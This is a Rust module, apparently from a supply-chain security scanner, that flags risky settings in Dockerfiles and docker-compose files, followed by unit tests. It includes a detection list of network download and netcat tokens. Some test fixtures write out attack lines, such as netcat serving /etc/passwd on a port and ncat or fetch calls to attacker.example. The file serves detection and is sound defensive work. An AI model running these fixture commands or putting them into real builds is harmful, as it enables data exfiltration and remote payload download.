use super::strip_inline_hash_comment;
use crate::artifact_graph::{ArtifactCapability, ArtifactCapabilityFact, ArtifactRelation};
use crate::findings::{
    ArtifactKind, EvidenceKind, Finding, MatchTarget, RecommendedAction, Severity, ThreatCategory,
};
use crate::services::artifact_analysis::{ArtifactAnalysisService, ArtifactLink};
use std::path::Path;

/// Whether `volume` references the sensitive host root `root` either as a
/// bare anonymous volume (`/root`, `/root/.ssh`) or as a bind mount source
/// (`/root:/k`, `/root/.ssh:/k`).
///
/// A plain `volume.starts_with(root)` over-matches sibling stems —
/// `/rootfs`, `/processed`, `/system` would all spuriously land on
/// `/root`, `/proc`, `/sys` respectively. Requiring the next byte to be
/// either `/` or `:` reproduces the explicit-boundary semantics that
/// `/etc/` and `/var/run/docker.sock:` already encode literally.
fn matches_root_path(volume: &str, root: &str) -> bool {
    if volume == root {
        return true;
    }
    if let Some(rest) = volume.strip_prefix(root) {
        return rest.starts_with('/') || rest.starts_with(':');
    }
    false
}

/// Whether a docker-compose `volumes` entry mounts a sensitive part of the host
/// filesystem (or the entire host root) into the container.
///
/// Relative bind mounts contained within the project (`./data:/data`,
/// `./logs:/var/log/app`) are NOT sensitive — they expose project-local data,
/// not host data. Only absolute mounts that target host-trust boundaries
/// (`/var/run/docker.sock`, `/etc`, `/proc`, `/sys`, `/root`, root `/:`,
/// `:/host` aliases, or any absolute `/X:/Y` bind mount) escalate the
/// `HostFilesystemAccess` / `FilesystemWrite` capabilities and the
/// `MANIFEST_DOCKER_COMPOSE_HOST_MOUNT` finding. This shared classifier
/// keeps the finding pass and the capability pass aligned — previously the
/// capability pass treated `./` mounts as host access, inflating
/// `effective_capabilities` and blast-radius factors.
fn is_sensitive_host_volume(volume: &str) -> bool {
    volume.starts_with("/:")
        || volume.contains(":/host")
        || volume.starts_with("/var/run/docker.sock:")
        || volume.starts_with("/etc/")
        || matches_root_path(volume, "/root")
        || matches_root_path(volume, "/proc")
        || matches_root_path(volume, "/sys")
        || (volume.starts_with('/') && volume.contains(":/"))
}

/// Whether a docker-compose `env_file` value carries at least one usable path.
///
/// Schema permits a single string (`env_file: .env`) or a list of strings
/// (`env_file: [.env, .env.prod]`). `null`, empty string, empty list, or a
/// list of empty/whitespace strings carry no real environment file and must
/// NOT raise `MANIFEST_DOCKER_COMPOSE_ENV_FILE` or `SecretAccess`.
fn env_file_has_real_paths(value: &serde_yaml::Value) -> bool {
    match value {
        serde_yaml::Value::String(s) => !s.trim().is_empty(),
        serde_yaml::Value::Sequence(seq) => seq
            .iter()
            .any(|item| item.as_str().is_some_and(|s| !s.trim().is_empty())),
        _ => false,
    }
}

/// Render a docker-compose `env_file` value as a clean comma-separated path
/// list. String shape returns the trimmed path; sequence shape joins the
/// non-empty entries with `, `. Used as `match_value` text — the previous
/// `format!("{:?}", env_file)` produced the YAML debug wrapper (`String("…")`)
/// which leaks internal types into audit output.
fn render_env_file(value: &serde_yaml::Value) -> String {
    match value {
        serde_yaml::Value::String(s) => s.trim().to_string(),
        serde_yaml::Value::Sequence(seq) => seq
            .iter()
            .filter_map(|item| item.as_str().map(str::trim).filter(|s| !s.is_empty()))
            .collect::<Vec<_>>()
            .join(", "),
        _ => String::new(),
    }
}

pub(crate) fn analyze_dockerfile(path: &Path, content: &str) -> Vec<Finding> {
    let artifact_path = path.display().to_string();
    let mut findings = Vec::new();

    for line in content.lines().map(str::trim) {
        let lower_line = line.to_ascii_lowercase();
        if lower_line.starts_with("from ") && lower_line.contains(":latest") {
            findings.push(
                Finding::builder("MANIFEST_DOCKER_LATEST_TAG", ThreatCategory::SupplyChain)
                    .severity(Severity::Low)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(line)
                    .reason("Docker base image uses the mutable latest tag")
                    .build(),
            );
        }
    }

    findings
}

pub(crate) fn analyze_docker_compose(path: &Path, content: &str) -> Vec<Finding> {
    let artifact_path = path.display().to_string();

    // A `docker-compose.yml` whose YAML body is unparseable is suspicious on
    // its own: the manifest is shipped, the rest of the analysis pipeline
    // (capabilities, relations) silently drops it for lack of structure, and
    // an attacker can intentionally craft "almost valid" YAML to bypass every
    // host-mount / privilege / env_file detector below. Emit an explicit
    // finding so the manifest's existence — and our inability to analyze it —
    // is recorded in the audit output instead of being swallowed.
    let yaml = match serde_yaml::from_str::<serde_yaml::Value>(content) {
        Ok(v) => v,
        Err(err) => {
            return vec![Finding::builder(
                "MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE",
                ThreatCategory::Generic,
            )
            .severity(Severity::Low)
            .action(RecommendedAction::Log)
            .evidence_kind(EvidenceKind::Context)
            .matched_on(MatchTarget::ReferencedFile {
                path: artifact_path.clone(),
            })
            .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
            .match_value(err.to_string())
            .reason(
                "docker-compose manifest is not valid YAML; capability and \
                         volume/env analyses cannot run against this file",
            )
            .build()];
        }
    };

    let mut findings = Vec::new();

    let Some(services) = yaml.get("services").and_then(serde_yaml::Value::as_mapping) else {
        return findings;
    };

    for (service_name, service) in services {
        let service_name = service_name.as_str().unwrap_or("unknown");
        let Some(mapping) = service.as_mapping() else {
            continue;
        };

        if let Some(image) = mapping
            .get(serde_yaml::Value::String("image".to_string()))
            .and_then(serde_yaml::Value::as_str)
        {
            if image.ends_with(":latest") {
                findings.push(
                    Finding::builder(
                        "MANIFEST_DOCKER_COMPOSE_LATEST_TAG",
                        ThreatCategory::SupplyChain,
                    )
                    .severity(Severity::Low)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Context)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{service_name}: {image}"))
                    .reason("docker-compose service uses a mutable latest image tag")
                    .build(),
                );
            }
        }

        if mapping.contains_key(serde_yaml::Value::String("privileged".to_string()))
            && mapping
                .get(serde_yaml::Value::String("privileged".to_string()))
                .and_then(serde_yaml::Value::as_bool)
                == Some(true)
        {
            findings.push(
                Finding::builder(
                    "MANIFEST_DOCKER_COMPOSE_PRIVILEGED",
                    ThreatCategory::PrivilegeEscalation,
                )
                .severity(Severity::Medium)
                .action(RecommendedAction::RequireApproval)
                .evidence_kind(EvidenceKind::Behavior)
                .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.clone(),
                })
                .match_value(format!("{service_name}: privileged=true"))
                .reason("docker-compose service requests privileged execution")
                .build(),
            );
        }

        if let Some(volumes) = mapping
            .get(serde_yaml::Value::String("volumes".to_string()))
            .and_then(serde_yaml::Value::as_sequence)
        {
            for volume in volumes.iter().filter_map(serde_yaml::Value::as_str) {
                if is_sensitive_host_volume(volume) {
                    findings.push(
                        Finding::builder(
                            "MANIFEST_DOCKER_COMPOSE_HOST_MOUNT",
                            ThreatCategory::PrivilegeEscalation,
                        )
                        .severity(Severity::Medium)
                        .action(RecommendedAction::RequireApproval)
                        .evidence_kind(EvidenceKind::Behavior)
                        .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                        .matched_on(MatchTarget::ReferencedFile {
                            path: artifact_path.clone(),
                        })
                        .match_value(format!("{service_name}: {volume}"))
                        .reason("docker-compose service mounts sensitive host paths")
                        .build(),
                    );
                }
            }
        }

        if let Some(network_mode) = mapping
            .get(serde_yaml::Value::String("network_mode".to_string()))
            .and_then(serde_yaml::Value::as_str)
        {
            if matches!(network_mode, "host" | "service:host") {
                findings.push(
                    Finding::builder(
                        "MANIFEST_DOCKER_COMPOSE_HOST_NETWORK",
                        ThreatCategory::PrivilegeEscalation,
                    )
                    .severity(Severity::Medium)
                    .action(RecommendedAction::RequireApproval)
                    .evidence_kind(EvidenceKind::Behavior)
                    .matched_on(MatchTarget::ReferencedFile {
                        path: artifact_path.clone(),
                    })
                    .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                    .match_value(format!("{service_name}: network_mode={network_mode}"))
                    .reason("docker-compose service shares the host network namespace")
                    .build(),
                );
            }
        }

        if let Some(env_file) = mapping
            .get(serde_yaml::Value::String("env_file".to_string()))
            .filter(|value| env_file_has_real_paths(value))
        {
            findings.push(
                Finding::builder(
                    "MANIFEST_DOCKER_COMPOSE_ENV_FILE",
                    ThreatCategory::CredentialExposure,
                )
                .severity(Severity::Low)
                .action(RecommendedAction::RequireApproval)
                .evidence_kind(EvidenceKind::Context)
                .artifact(ArtifactKind::PackageManifest, Some(artifact_path.clone()))
                .matched_on(MatchTarget::ReferencedFile {
                    path: artifact_path.clone(),
                })
                .match_value(format!("{service_name}: {}", render_env_file(env_file)))
                .reason("docker-compose service loads environment files that may contain secrets")
                .build(),
            );
        }
    }

    findings
}

/// Tokens that, when present in a lowercased Dockerfile line, indicate the
/// build pulls something from the network at image-build time.
///
/// The list is ordered roughly by frequency in real Dockerfiles. Each token
/// includes a trailing whitespace where ambiguity with substrings (`unc`,
/// `func`, `vncserver`) is plausible — e.g. ` nc ` requires whitespace on
/// both sides so it doesn't match `func` or `unc`. Pre-fix only `curl`,
/// `wget`, and `invoke-webrequest` were detected, which let
/// `python:slim`-style Dockerfiles using `python -m urllib`, BSD `fetch`,
/// or raw `nc` evade the NetworkAccess capability.
const DOCKERFILE_NETWORK_DOWNLOAD_TOKENS: &[&str] = &[
    "curl ",
    "wget ",
    "invoke-webrequest",
    "ncat ",
    " nc ",
    "fetch ",
    "python -m urllib",
    "python -m http",
    "python -c \"import urllib",
    "python -c 'import urllib",
    "perl -mlwp",
];

pub(crate) fn dockerfile_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let mut has_expose = false;
    let mut has_run = false;
    let mut has_copy_or_add = false;
    let mut has_network_download = false;

    for line in content.lines() {
        let code = strip_inline_hash_comment(line.trim_start());
        let trimmed = code.to_ascii_lowercase();
        if !has_expose && (trimmed.starts_with("expose ") || trimmed.trim_end() == "expose") {
            has_expose = true;
        }
        if !has_run && trimmed.starts_with("run ") {
            has_run = true;
        }
        if !has_copy_or_add && (trimmed.starts_with("copy ") || trimmed.starts_with("add ")) {
            has_copy_or_add = true;
        }
        if !has_network_download
            && DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
                .iter()
                .any(|t| trimmed.contains(t))
        {
            has_network_download = true;
        }
    }

    let mut capabilities = Vec::new();
    if has_expose {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_network_download {
        capabilities.push(ArtifactAnalysisService::observed_capability(
            ArtifactCapability::NetworkAccess,
        ));
    }
    if has_run {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::ProcessExecution,
        ));
    }
    if has_copy_or_add {
        capabilities.push(ArtifactAnalysisService::declared_capability(
            ArtifactCapability::FilesystemWrite,
        ));
    }

    capabilities
}

pub(crate) fn docker_compose_capabilities(content: &str) -> Vec<ArtifactCapabilityFact> {
    let Ok(yaml) = serde_yaml::from_str::<serde_yaml::Value>(content) else {
        return Vec::new();
    };

    let mut capabilities = Vec::new();
    let Some(services) = yaml.get("services").and_then(serde_yaml::Value::as_mapping) else {
        return capabilities;
    };

    for (_, service) in services {
        let Some(mapping) = service.as_mapping() else {
            continue;
        };

        if mapping
            .get(serde_yaml::Value::String("privileged".to_string()))
            .and_then(serde_yaml::Value::as_bool)
            .unwrap_or(false)
            && !capabilities.iter().any(|fact| {
                fact.capability == ArtifactCapability::PrivilegedRuntime
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Declared
            })
        {
            capabilities.push(ArtifactAnalysisService::declared_capability(
                ArtifactCapability::PrivilegedRuntime,
            ));
        }

        if let Some(volumes) = mapping
            .get(serde_yaml::Value::String("volumes".to_string()))
            .and_then(serde_yaml::Value::as_sequence)
        {
            if volumes
                .iter()
                .any(|volume| volume.as_str().is_some_and(is_sensitive_host_volume))
                && !capabilities.iter().any(|fact| {
                    fact.capability == ArtifactCapability::HostFilesystemAccess
                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Declared
                })
            {
                capabilities.push(ArtifactAnalysisService::declared_capability(
                    ArtifactCapability::HostFilesystemAccess,
                ));
                capabilities.push(ArtifactAnalysisService::declared_capability(
                    ArtifactCapability::FilesystemWrite,
                ));
            }
        }

        if mapping.contains_key(serde_yaml::Value::String("ports".to_string()))
            && !capabilities.iter().any(|fact| {
                fact.capability == ArtifactCapability::NetworkAccess
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Declared
            })
        {
            capabilities.push(ArtifactAnalysisService::declared_capability(
                ArtifactCapability::NetworkAccess,
            ));
        }

        if mapping
            .get(serde_yaml::Value::String("env_file".to_string()))
            .is_some_and(env_file_has_real_paths)
            && !capabilities.iter().any(|fact| {
                fact.capability == ArtifactCapability::SecretAccess
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Declared
            })
        {
            capabilities.push(ArtifactAnalysisService::declared_capability(
                ArtifactCapability::SecretAccess,
            ));
        }

        if (mapping.contains_key(serde_yaml::Value::String("command".to_string()))
            || mapping.contains_key(serde_yaml::Value::String("entrypoint".to_string())))
            && !capabilities.iter().any(|fact| {
                fact.capability == ArtifactCapability::ProcessExecution
                    && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Declared
            })
        {
            capabilities.push(ArtifactAnalysisService::declared_capability(
                ArtifactCapability::ProcessExecution,
            ));
        }
    }

    capabilities
}

pub(crate) fn dockerfile_relations(content: &str) -> Vec<ArtifactLink> {
    let mut links = Vec::new();
    for line in content.lines().map(str::trim) {
        let code = strip_inline_hash_comment(line);
        let lower = code.to_ascii_lowercase();
        if lower.starts_with("from ") {
            links.push(ArtifactLink {
                target: code[5..].trim().to_string(),
                relation: ArtifactRelation::Loads,
            });
        }
        // Mirror `dockerfile_capabilities`: any token in
        // `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS` is a remote-fetch.
        // Pre-fix relations only saw `curl` and `wget`, so a Dockerfile
        // using `python -m urllib`, `nc`, `fetch`, etc. recorded
        // `NetworkAccess` capability without the matching `Downloads`
        // edge — the artifact graph then missed cross-artifact composite
        // capabilities (e.g. `ShellDownloadExec`) that key off the edge.
        if DOCKERFILE_NETWORK_DOWNLOAD_TOKENS
            .iter()
            .any(|t| lower.contains(t))
        {
            links.push(ArtifactLink {
                target: "remote-resource".to_string(),
                relation: ArtifactRelation::Downloads,
            });
        }
    }
    links
}

pub(crate) fn docker_compose_relations(content: &str) -> Vec<ArtifactLink> {
    let mut links = Vec::new();
    let Ok(yaml) = serde_yaml::from_str::<serde_yaml::Value>(content) else {
        return links;
    };
    let Some(services) = yaml.get("services").and_then(serde_yaml::Value::as_mapping) else {
        return links;
    };
    for (_, service) in services {
        let Some(mapping) = service.as_mapping() else {
            continue;
        };
        if let Some(image) = mapping
            .get(serde_yaml::Value::String("image".to_string()))
            .and_then(serde_yaml::Value::as_str)
        {
            links.push(ArtifactLink {
                target: image.to_string(),
                relation: ArtifactRelation::Loads,
            });
        }
        if mapping.contains_key(serde_yaml::Value::String("ports".to_string())) {
            links.push(ArtifactLink {
                target: "network".to_string(),
                relation: ArtifactRelation::ConnectsTo,
            });
        }
        if mapping.contains_key(serde_yaml::Value::String("volumes".to_string())) {
            links.push(ArtifactLink {
                target: "host-filesystem".to_string(),
                relation: ArtifactRelation::Mounts,
            });
        }
        if mapping.contains_key(serde_yaml::Value::String("env_file".to_string())) {
            links.push(ArtifactLink {
                target: ".env".to_string(),
                relation: ArtifactRelation::AccessesSecrets,
            });
        }
        if mapping.contains_key(serde_yaml::Value::String("command".to_string()))
            || mapping.contains_key(serde_yaml::Value::String("entrypoint".to_string()))
        {
            links.push(ArtifactLink {
                target: "process".to_string(),
                relation: ArtifactRelation::Executes,
            });
        }
    }
    links
}

#[cfg(test)]
mod tests {
    use super::*;

    fn capability_present(caps: &[ArtifactCapabilityFact], target: ArtifactCapability) -> bool {
        caps.iter().any(|fact| fact.capability == target)
    }

    fn finding_present(findings: &[Finding], rule_id: &str) -> bool {
        findings.iter().any(|finding| finding.rule_id == rule_id)
    }

    fn match_value_for(findings: &[Finding], rule_id: &str) -> Option<String> {
        findings
            .iter()
            .find(|finding| finding.rule_id == rule_id)
            .map(|finding| finding.match_value.clone())
    }

    /// Contract: a relative bind mount contained in the project (`./data:/data`)
    /// does NOT escalate `HostFilesystemAccess` / `FilesystemWrite`. Only
    /// host-trust-boundary mounts do.
    #[test]
    fn docker_compose_host_filesystem_capability_skips_relative_project_volume() {
        let yaml = "services:\n  app:\n    image: nginx\n    volumes:\n      - \"./data:/data\"\n";
        let caps = docker_compose_capabilities(yaml);
        assert!(!capability_present(
            &caps,
            ArtifactCapability::HostFilesystemAccess
        ));
        assert!(!capability_present(
            &caps,
            ArtifactCapability::FilesystemWrite
        ));
    }

    /// Contract: mounting the docker socket exposes the host control plane and
    /// MUST emit `HostFilesystemAccess` and `FilesystemWrite`.
    #[test]
    fn docker_compose_host_filesystem_capability_fires_for_docker_socket() {
        let yaml = "services:\n  app:\n    image: nginx\n    volumes:\n      - \"/var/run/docker.sock:/var/run/docker.sock\"\n";
        let caps = docker_compose_capabilities(yaml);
        assert!(capability_present(
            &caps,
            ArtifactCapability::HostFilesystemAccess
        ));
        assert!(capability_present(
            &caps,
            ArtifactCapability::FilesystemWrite
        ));
    }

    /// Contract: mounting `/etc` from the host is sensitive and MUST escalate.
    #[test]
    fn docker_compose_host_filesystem_capability_fires_for_etc_mount() {
        let yaml =
            "services:\n  app:\n    image: nginx\n    volumes:\n      - \"/etc/passwd:/host-etc/passwd\"\n";
        let caps = docker_compose_capabilities(yaml);
        assert!(capability_present(
            &caps,
            ArtifactCapability::HostFilesystemAccess
        ));
    }

    /// Contract: the HOST_MOUNT finding matches the capability rule — relative
    /// project volumes do not fire it.
    #[test]
    fn docker_compose_host_mount_finding_skips_relative_project_volume() {
        let yaml = "services:\n  app:\n    image: nginx\n    volumes:\n      - \"./data:/data\"\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, yaml);
        assert!(!finding_present(
            &findings,
            "MANIFEST_DOCKER_COMPOSE_HOST_MOUNT"
        ));
    }

    /// Contract: `env_file: null` carries no path; the finding and SecretAccess
    /// capability must NOT fire.
    #[test]
    fn docker_compose_env_file_finding_skips_null_value() {
        let yaml = "services:\n  app:\n    image: nginx\n    env_file: null\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, yaml);
        let caps = docker_compose_capabilities(yaml);
        assert!(!finding_present(
            &findings,
            "MANIFEST_DOCKER_COMPOSE_ENV_FILE"
        ));
        assert!(!capability_present(&caps, ArtifactCapability::SecretAccess));
    }

    /// Contract: `env_file: []` (empty list) carries no path; finding and
    /// capability must NOT fire.
    #[test]
    fn docker_compose_env_file_finding_skips_empty_sequence() {
        let yaml = "services:\n  app:\n    image: nginx\n    env_file: []\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, yaml);
        let caps = docker_compose_capabilities(yaml);
        assert!(!finding_present(
            &findings,
            "MANIFEST_DOCKER_COMPOSE_ENV_FILE"
        ));
        assert!(!capability_present(&caps, ArtifactCapability::SecretAccess));
    }

    /// Contract: a string `env_file` renders as the bare path in `match_value`,
    /// not as the YAML debug wrapper `String("…")`.
    #[test]
    fn docker_compose_env_file_finding_uses_clean_match_value_for_string() {
        let yaml = "services:\n  app:\n    image: nginx\n    env_file: .env\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, yaml);
        let value = match_value_for(&findings, "MANIFEST_DOCKER_COMPOSE_ENV_FILE")
            .expect("env_file finding should fire for non-empty string");
        assert_eq!(value, "app: .env");
        assert!(!value.contains("String("));
    }

    /// Contract: a sequence `env_file` renders entries comma-separated in
    /// `match_value`, not as the YAML debug wrapper.
    #[test]
    fn docker_compose_env_file_finding_uses_clean_match_value_for_sequence() {
        let yaml =
            "services:\n  app:\n    image: nginx\n    env_file:\n      - .env\n      - .env.prod\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, yaml);
        let value = match_value_for(&findings, "MANIFEST_DOCKER_COMPOSE_ENV_FILE")
            .expect("env_file finding should fire for non-empty sequence");
        assert_eq!(value, "app: .env, .env.prod");
        assert!(!value.contains("String("));
    }

    /// Contract: `is_sensitive_host_volume` matches the sensitive root
    /// either bare (`/root`) or as a sub-path (`/root/.ssh`) and as a
    /// bind mount source (`/root:/k`, `/root/.ssh:/k`). The pre-fix
    /// `starts_with("/root")` over-matched sibling stems like `/rootfs`,
    /// `/processed`, `/system` because there was no boundary on the
    /// next byte after the root.
    #[test]
    fn matches_root_path_anchors_at_path_or_colon_boundary() {
        // Positive: bare anonymous volume, exact root.
        assert!(matches_root_path("/root", "/root"));
        // Positive: bare anonymous sub-path.
        assert!(matches_root_path("/root/.ssh", "/root"));
        // Positive: bind mount on the root.
        assert!(matches_root_path("/root:/k", "/root"));
        // Positive: bind mount on a sub-path of the root.
        assert!(matches_root_path("/root/.ssh:/k", "/root"));
        // Negative: sibling stem must NOT match.
        assert!(!matches_root_path("/rootfs", "/root"));
        assert!(!matches_root_path("/rootfs:/data", "/root"));
        assert!(!matches_root_path("/root_bak/x:/y", "/root"));
        // Same boundary semantics for /proc and /sys.
        assert!(matches_root_path("/proc:/proc", "/proc"));
        assert!(matches_root_path("/proc/1:/p1", "/proc"));
        assert!(!matches_root_path("/processed:/log", "/proc"));
        assert!(!matches_root_path("/proc-tools:/x", "/proc"));
        assert!(matches_root_path("/sys/kernel:/k", "/sys"));
        assert!(!matches_root_path("/system:/sys", "/sys"));
        assert!(!matches_root_path("/sysv:/x", "/sys"));
    }

    /// Contract: a bare anonymous YAML volume that shares a literal stem
    /// with `/root` (e.g. `/rootfs`) is NOT classified as a sensitive
    /// host mount. The bare-path branch was the only place where the
    /// pre-fix prefix-match caused a false positive in practice; the
    /// `:/...` form is also flagged via the catch-all "any absolute
    /// bind mount", so we explicitly exercise the bare form here to pin
    /// the boundary semantics.
    #[test]
    fn is_sensitive_host_volume_rejects_root_stem_lookalikes_bare() {
        assert!(!is_sensitive_host_volume("/rootfs"));
        assert!(!is_sensitive_host_volume("/rootkit"));
        assert!(!is_sensitive_host_volume("/processed"));
        assert!(!is_sensitive_host_volume("/sysv"));
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT flip `NetworkAccess` to observed. The pre-fix code only
    /// suppressed lines whose first non-whitespace char was `#`, so
    /// `RUN echo ok # curl example.com` would still match `"curl "`
    /// in the lower-cased line.
    #[test]
    fn dockerfile_capabilities_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://old\n";
        let caps = dockerfile_capabilities(content);
        // declared NetworkAccess from EXPOSE etc. would still be possible,
        // but in this fixture there is no EXPOSE — so neither declared
        // nor observed NetworkAccess should be present.
        assert!(!capability_present(
            &caps,
            ArtifactCapability::NetworkAccess
        ));
    }

    /// Contract: a real `RUN curl ...` step still flips observed
    /// NetworkAccess. Pins that the inline-comment stripper does not
    /// erase the real curl preceding the `#`.
    #[test]
    fn dockerfile_capabilities_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let caps = dockerfile_capabilities(content);
        assert!(capability_present(&caps, ArtifactCapability::NetworkAccess));
    }

    /// Contract: an inline `# ... curl ...` comment in a Dockerfile must
    /// NOT add a Downloads link. The pre-fix code suppressed only lines
    /// whose first non-whitespace char was `#`, so the trailing comment
    /// fed into `artifact_taint` and produced a spurious
    /// `ARTIFACT_TAINT_DOWNLOAD_TO_EXECUTION` Critical finding when
    /// combined with any process-execution edge in the package.
    #[test]
    fn dockerfile_relations_skips_curl_in_inline_comment() {
        let content = "FROM alpine:3\nRUN echo ok # was: curl https://gone\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().all(|l| l.target != "remote-resource"),
            "no Downloads link should be created from an inline-comment curl; got {links:?}",
        );
    }

    /// Contract: a real `RUN curl ...` step still produces a Downloads
    /// link. Anchors that the inline-comment stripper preserves real
    /// evidence preceding the `#`.
    #[test]
    fn dockerfile_relations_detects_real_curl_with_trailing_comment() {
        let content = "FROM alpine:3\nRUN curl https://x  # bootstrap\n";
        let links = dockerfile_relations(content);
        assert!(
            links.iter().any(|l| l.target == "remote-resource"),
            "real curl invocation should produce a Downloads link; got {links:?}",
        );
    }

    /// Contract: a Dockerfile that fetches a payload via `python -m
    /// urllib.request` MUST flip the observed NetworkAccess capability.
    /// Pre-fix, only `curl`, `wget`, and `invoke-webrequest` were detected,
    /// so a `python:slim`-based image fetching with `python -m urllib.request`
    /// silently failed the capability check.
    #[test]
    fn dockerfile_capabilities_detects_python_urllib_download() {
        let content = "FROM python:3.11-slim\nRUN python -m urllib.request https://x/payload\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            has_observed_network,
            "python -m urllib must flip observed NetworkAccess; got {caps:?}",
        );
    }

    /// Contract: BSD `fetch` and raw `nc` (netcat) are equally valid
    /// download/exfil tools and must trip the same capability gate.
    #[test]
    fn dockerfile_capabilities_detects_fetch_and_netcat() {
        let fetch = "FROM alpine\nRUN fetch -o /tmp/x https://internal/payload\n";
        let nc = "FROM alpine\nRUN nc -lvp 4444 > /tmp/x\n";
        for content in [fetch, nc] {
            let caps = dockerfile_capabilities(content);
            assert!(
                caps.iter().any(|fact| {
                    fact.capability == ArtifactCapability::NetworkAccess
                        && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
                }),
                "expected observed NetworkAccess for {content:?}; got {caps:?}",
            );
        }
    }

    /// Contract: tokens like `nc` MUST require explicit whitespace boundaries
    /// — a substring match against `func`, `unc`, `vncserver`, etc., would
    /// over-fire. This pins the negative case to keep the boundary logic.
    #[test]
    fn dockerfile_capabilities_does_not_overmatch_substrings_of_nc() {
        let content = "FROM alpine\nRUN apk add func unc vncserver\n";
        let caps = dockerfile_capabilities(content);
        let has_observed_network = caps.iter().any(|fact| {
            fact.capability == ArtifactCapability::NetworkAccess
                && fact.source == crate::artifact_graph::ArtifactCapabilitySource::Observed
        });
        assert!(
            !has_observed_network,
            "substrings like func/unc/vncserver must not trip observed NetworkAccess; got {caps:?}",
        );
    }

    /// Contract: `dockerfile_relations` must record a `Downloads` edge for
    /// EVERY token in `DOCKERFILE_NETWORK_DOWNLOAD_TOKENS`, paralleling
    /// `dockerfile_capabilities`. Pre-fix only `curl `/`wget ` produced an
    /// edge, so a Dockerfile using `python -m urllib`, `nc`, `fetch`, etc.,
    /// declared NetworkAccess capability without the matching Downloads
    /// edge — and downstream composite-capability detectors that key off
    /// the edge (e.g. `ShellDownloadExec`) silently missed.
    #[test]
    fn dockerfile_relations_records_download_edge_for_python_urllib() {
        let content = "FROM alpine\nRUN python -m urllib https://attacker.example/x.py\n";
        let links = dockerfile_relations(content);
        assert!(
            links
                .iter()
                .any(|l| matches!(l.relation, ArtifactRelation::Downloads)
                    && l.target == "remote-resource"),
            "python -m urllib must produce a Downloads edge; got {links:?}",
        );
    }

    /// Contract: same coverage parity for `nc`/`ncat`/`fetch`/`perl -mlwp`
    /// — pre-fix the edge only fired for `curl`/`wget`. Pinning the four
    /// most common alternatives keeps the parity from regressing.
    #[test]
    fn dockerfile_relations_records_download_edge_for_alternate_tools() {
        for token in [
            "RUN nc -lvp 4444 < /etc/passwd\n",
            "RUN ncat attacker.example 4444\n",
            "RUN fetch https://attacker.example/x\n",
            "RUN perl -MLWP::Simple -e 'getstore(...)'\n",
        ] {
            let content = format!("FROM alpine\n{token}");
            let links = dockerfile_relations(&content);
            assert!(
                links
                    .iter()
                    .any(|l| matches!(l.relation, ArtifactRelation::Downloads)),
                "token line `{token}` must produce a Downloads edge; got {links:?}",
            );
        }
    }

    /// Contract: a `docker-compose.yml` whose body fails to parse MUST emit
    /// an explicit `MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE` finding. Pre-fix
    /// the function silently returned `Vec::new()`, so an attacker could
    /// ship intentionally-broken YAML to suppress every host-mount /
    /// privilege / env_file detector in this file without leaving any audit
    /// trail of the manifest's existence.
    #[test]
    fn analyze_docker_compose_emits_parse_failure_finding_for_invalid_yaml() {
        // `:` after `services` must be followed by mapping indentation; a
        // bare scalar produces a parse error in serde_yaml.
        let bad = "services: [unterminated\n  app:\n    image: nginx\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
        let findings = analyze_docker_compose(path, bad);
        assert!(
            finding_present(&findings, "MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE"),
            "invalid YAML must produce a parse-failure finding; got {findings:?}",
        );
        // And no other detector should fire — there's no parsed structure
        // to derive host-mount / privileged / env_file findings from.
        let only_parse_failure = findings
            .iter()
            .all(|f| f.rule_id == "MANIFEST_DOCKER_COMPOSE_PARSE_FAILURE");
        assert!(
            only_parse_failure,
            "no other detector should fire on invalid YAML; got {findings:?}",
        );
    }

    /// Contract: a valid `docker-compose.yml` MUST NOT produce a parse-failure
    /// finding. Negative case for the parse-failure detector — pins that the
    /// gate is on the YAML error, not on the absence of services etc.
    #[test]
    fn analyze_docker_compose_does_not_emit_parse_failure_for_valid_yaml() {
        let good = "services:\n  app:\n    image: nginx:1.25\n";
        let path = std::path::Path::new("/pkg/docker-compose.yml");
